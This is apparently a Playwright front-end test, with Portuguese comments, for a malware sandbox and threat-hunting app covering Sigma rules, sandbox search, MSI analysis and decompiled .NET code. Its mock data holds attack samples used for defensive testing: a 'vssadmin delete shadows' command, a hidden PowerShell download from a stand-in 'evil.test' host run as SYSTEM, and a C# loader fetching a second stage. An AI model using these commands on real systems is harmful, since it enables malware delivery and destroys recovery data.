// Caca e formatos (plans/caca-e-formatos): a pagina das regras Sigma (equipe e catalogo), a busca
// no sandbox, a secao do MSI (formato de entrega) e a do codigo .NET na ficha. Confere o que aparece
// e os pedidos que a tela faz.
import { chromium } from 'playwright';

import { createState, entries, ORIGIN, OUT, setupMock, watchErrors } from './mock-api.mjs';

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
const state = createState({ loggedIn: true });
const t = (min) => new Date(Date.UTC(2026, 10, 12, 15, min)).toISOString();
const summary = { ruleId: 'team:r1', title: 'Equipe - vssadmin apaga cópias', level: 'high', eventIds: [1], techniques: ['T1490'] };

state.sigmaRules = {
  active: { vendored: 1636, team: 1 },
  rules: [
    {
      id: 'r1', ruleId: 'team:r1', name: summary.title, source: 'title: x', enabled: true,
      evaluatedAt: t(5), evaluating: false, firedRuns: 3, rule: summary,
      createdAt: t(0), updatedAt: t(5), createdBy: { id: 'u1', displayName: 'Ana Souza' }, updatedBy: { id: 'u1', displayName: 'Ana Souza' },
    },
  ],
};
state.sigmaNewRule = {
  ...state.sigmaRules.rules[0], id: 'r2', ruleId: 'team:r2', name: 'Equipe - nome da regra', evaluatedAt: null, evaluating: true, firedRuns: 0,
  rule: { ...summary, ruleId: 'team:r2', title: 'Equipe - nome da regra', eventIds: [1], techniques: ['T1059.001'] },
};
state.sigmaRuns = [{ id: 'sb-e1', startedAt: t(0), entryTitle: 'fatura.exe', events: 412 }];
state.sigmaValidate = { ok: true, errors: [], rule: { ...summary, title: 'Equipe - nome da regra', techniques: ['T1059.001'] } };
state.sigmaTest = {
  rule: summary, matched: 1, scanned: 412, truncated: false,
  events: [{ time: t(2), eventId: 1, image: 'C:\\Windows\\System32\\vssadmin.exe', pid: 4600, sample: true, event: { CommandLine: 'vssadmin.exe delete shadows /all /quiet' } }],
};
state.sigmaCatalog = {
  source: { name: 'SigmaHQ', release: 'r2026-07-01', license: 'DRL 1.1', url: 'https://github.com/SigmaHQ/sigma' },
  total: 1, disabledTotal: 0, page: 1, pageSize: 100,
  rules: [{ ruleId: 'abc-whoami', title: 'Enumerate All Information With Whoami.EXE', level: 'medium', eventIds: [1], techniques: ['T1033'], path: 'rules/windows/process_creation/whoami.yml', description: null, enabled: true, firedRuns: 7, url: 'https://github.com/SigmaHQ/sigma/blob/r/whoami.yml', evaluating: false }],
};
const ev = (min, cmd, sample = true) => ({ time: t(min), eventId: 1, image: 'C:\\Windows\\System32\\vssadmin.exe', pid: 4600, sample, summary: cmd, data: { CommandLine: cmd } });
state.huntRuns = {
  total: 2, nextOffset: null, capped: false,
  runs: [
    { sessionId: 'sb-e1', entryId: 'e1', entryTitle: 'instalador_suspeito.exe', startedAt: t(0), matched: 2, first: [ev(1, 'vssadmin.exe delete shadows /all /quiet')] },
    { sessionId: 'sb-e2', entryId: 'e2', entryTitle: 'boleto.exe', startedAt: t(-90), matched: 1, first: [ev(-89, 'vssadmin.exe Delete Shadows')] },
  ],
};
state.huntEvents = { 'sb-e1': { total: 2, page: 1, pageSize: 50, events: [ev(1, 'vssadmin.exe delete shadows /all /quiet'), ev(2, 'vssadmin.exe list shadows')] } };

// A ficha: o MSI (formato de entrega) e o codigo .NET.
entries[0].staticInfo = {
  version: 1, analyzedAt: t(0), size: 2483712, bytesAnalyzed: 2483712,
  detectedType: { id: 'ole', label: 'Documento Office antigo / MSI (OLE)', extensions: ['msi'], executable: false },
  extensionMismatch: null, entropy: 6.1, entropyLevel: 'normal',
  strings: { total: 10, urls: [], ips: [], emails: [], paths: [], registry: [], suspicious: [] }, pe: null, iocCandidates: [],
  ...(entries[0].staticInfo ?? {}),
  delivery: {
    format: 'msi', risk: 'high',
    alerts: [{ level: 'high', text: 'Ação Baixa (como SYSTEM) roda: powershell -w hidden -c iwr http://msi.evil.test/p.exe' }],
    files: [{ name: 'AcaoDll.dll', size: 9216, sha256: 'a'.repeat(64), type: 'pe', source: 'Binary.AcaoDll', entryId: 'e2' }],
    msi: {
      product: { name: 'Atualizador Teste', manufacturer: 'Fornecedor Teste', version: '1.2.3', code: '{1111}' },
      customActions: [{ action: 'Baixa', type: 3106, kind: 'EXE com linha de comando', source: 'TARGETDIR', target: 'powershell -w hidden -c iwr http://msi.evil.test/p.exe', flags: ['adiada (durante a instalação)', 'como SYSTEM (sem personificação)'] }],
      binary: ['AcaoDll'], files: [], filesTotal: 0, tables: ['CustomAction', 'Binary', 'Property'],
    },
  },
};
state.serviceAnalyses = {
  e1: {
    dotnet: {
      enabled: true, auto: true, manual: true, maxMb: 30,
      analysis: {
        status: 'DONE', options: null, error: null, version: 'ilspycmd 11.2.0.10050', ms: 900, attempts: 1,
        createdAt: t(0), startedAt: t(0), finishedAt: t(1),
        alerts: [{ level: 'high', text: 'baixa conteúdo da internet: Carga/Programa.cs, linha 4' }],
        iocs: ['http://loader.evil.test/estagio2.bin'],
        result: {
          module: { name: 'dotnet-loader', framework: 'net40', outputType: 'Exe' },
          types: [{ path: 'Carga/Programa.cs', size: 300, lines: 6 }, { path: 'Properties/AssemblyInfo.cs', size: 80, lines: 2 }],
          findings: [{ rule: 'download', level: 'high', why: 'baixa conteúdo da internet', path: 'Carga/Programa.cs', line: 4, text: 'byte[] dados = wc.DownloadData("http://loader.evil.test/estagio2.bin");' }],
          obfuscators: ['ConfuserEx'],
          resources: [{ name: 'carga.bin', size: 9216, sha256: 'b'.repeat(64), kind: 'pe', entropy: 5.9, entryId: 'e3' }],
          urls: ['http://loader.evil.test/estagio2.bin'], truncated: false, sourceKey: 'dotnet/e1.json.gz',
        },
      },
    },
  },
};
state.dotnetSources = {
  e1: {
    'Carga/Programa.cs': 'namespace Carga;\npublic static class Programa {\n\tpublic static void Main() {\n\t\tbyte[] dados = wc.DownloadData("http://loader.evil.test/estagio2.bin");\n\t}\n}\n',
  },
};

await setupMock(context, state);
const page = await context.newPage();
watchErrors(page);
const settle = (ms = 600) => page.waitForTimeout(ms);
let failures = 0;
const expect = (label, ok, detail = '') => {
  if (!ok) failures += 1;
  console.log(`${ok ? 'ok  ' : 'FALHA'} ${label}${detail ? ` (${detail})` : ''}`);
};

// 1. Regras Sigma: a lista da equipe, o modelo, validar, testar, salvar e o catalogo.
await page.goto(ORIGIN + '/sigma', { waitUntil: 'networkidle' });
await settle();
let text = await page.locator('main').innerText();
expect('subtítulo com as contagens', text.includes('1 regra(s) da equipe ativa(s)') && text.includes('1.636 da SigmaHQ'), text.slice(0, 300));
expect('regra da equipe com as execuções que disparou', text.includes('Equipe - vssadmin apaga cópias') && text.includes('3 execução(ões)'));
await page.getByRole('button', { name: 'Usar o modelo' }).click();
expect('modelo preenche o YAML com um id novo', /id: [0-9a-f-]{36}/.test(await page.locator('#sigma-source').inputValue()));
await page.getByRole('button', { name: 'Validar' }).click();
await settle(300);
const compiled = await page.locator('.dl-compiler-output').innerText();
expect('validar mostra o que o compilador entendeu', compiled.includes('Equipe - nome da regra · nível alto · eventos 1'), compiled);
await page.locator('#sigma-run').selectOption('sb-e1');
await page.getByRole('button', { name: 'Testar numa execução' }).click();
await settle(300);
const testText = await page.locator('.dl-sigma-test__result').innerText();
expect('teste: casou, da amostra, sem gravar', testText.includes('1 evento(s) casaram, de 412 lido(s). Nada foi gravado.') && testText.includes('da amostra') && testText.includes('delete shadows'), testText);
expect('teste pede a execução escolhida', state.sigmaRequests.some((r) => r.kind === 'test' && r.body.sessionId === 'sb-e1'));
await page.screenshot({ path: `${OUT}/caca-sigma-editor.png`, fullPage: true });
await page.getByRole('button', { name: 'Salvar regra' }).first().click();
await settle();
text = await page.locator('main').innerText();
expect('salvar: aviso e a regra nova "avaliando"', text.includes('salva. As detecções dela nas execuções guardadas são refeitas em segundo plano') && text.includes('avaliando as execuções guardadas'), text.slice(0, 400));
await page.locator('#sigma-catalog-q').fill('whoami');
await page.getByRole('button', { name: 'Buscar' }).click();
await settle(300);
expect('catálogo: busca vai para a API', state.sigmaRequests.some((r) => r.kind === 'catalog' && r.query.q === 'whoami'));
await page.getByRole('button', { name: 'Desligar' }).click();
await settle(300);
expect('catálogo: desligar a vendorizada', state.sigmaRequests.some((r) => r.kind === 'toggle' && r.ruleId === 'abc-whoami' && r.body.enabled === false));
await page.screenshot({ path: `${OUT}/caca-sigma.png`, fullPage: true });

// 2. Busca no sandbox: os filtros na URL, o resultado por execucao e os eventos.
await page.goto(ORIGIN + '/busca-sandbox?field=commandline&value=vssadmin', { waitUntil: 'networkidle' });
await settle();
text = await page.locator('main').innerText();
expect('busca pela URL: campo e valor vão para a API', state.huntRequests?.[0]?.field === 'commandline' && state.huntRequests[0].value === 'vssadmin', JSON.stringify(state.huntRequests));
expect('resultado por execução', text.includes('2 execução(ões), a mais recente primeiro.') && text.includes('instalador_suspeito.exe') && text.includes('boleto.exe'));
await page.getByRole('button', { name: 'Ver os eventos' }).first().click();
await settle(300);
expect('eventos da execução', (await page.locator('main').innerText()).includes('vssadmin.exe list shadows'));
const runLink = await page.getByRole('link', { name: 'Abrir a execução' }).first().getAttribute('href');
expect('abrir a execução leva à ficha com a execução', runLink === '/entries/e1?execucao=sb-e1', runLink);
await page.locator('#hunt-scope').selectOption('sample');
await page.getByRole('button', { name: 'Buscar' }).click();
await settle(300);
expect('escopo da amostra na URL e no pedido', page.url().includes('scope=sample') && state.huntRequests.at(-1).scope === 'sample');
await page.screenshot({ path: `${OUT}/caca-busca.png`, fullPage: true });

// 3. A ficha: o MSI (aviso no topo, acoes e a filha) e o codigo .NET.
await page.goto(ORIGIN + '/entries/e1', { waitUntil: 'networkidle' });
await settle();
text = await page.locator('main').innerText();
expect('aviso do formato de entrega no topo', text.includes('Atenção: Ação Baixa (como SYSTEM) roda'));
expect('seção do MSI: produto, ação e flags', text.includes('Instalador MSI') && text.includes('Atualizador Teste') && text.includes('EXE com linha de comando') && text.includes('como SYSTEM (sem personificação)'));
expect('arquivo escondido leva à filha', (await page.getByRole('link', { name: 'AcaoDll.dll' }).getAttribute('href')) === '/entries/e2');
const net = page.locator('section.hpsm-section:has(.hpsm-section__head:has-text("Código .NET (ILSpy)"))');
const netText = await net.innerText();
expect('seção do .NET: achado, ofuscador e recurso', netText.includes('baixa conteúdo da internet') && netText.includes('ConfuserEx') && netText.includes('carga.bin'), JSON.stringify(netText.slice(0, 900)));
await settle(300);
expect('o fonte do tipo do primeiro achado, com a linha marcada', (await page.locator('.dl-dotnet__line.is-marked').innerText()).includes('DownloadData'));
expect('baixar o projeto', (await page.getByRole('link', { name: 'Baixar o projeto (.zip)' }).getAttribute('href')) === '/api/entries/e1/dotnet/download');
await net.screenshot({ path: `${OUT}/caca-dotnet.png` }).catch(() => undefined);
await page.screenshot({ path: `${OUT}/caca-ficha.png`, fullPage: true });

await browser.close();
console.log(failures ? `\n${failures} falha(s)` : '\nTudo certo');
process.exit(failures ? 1 : 0);
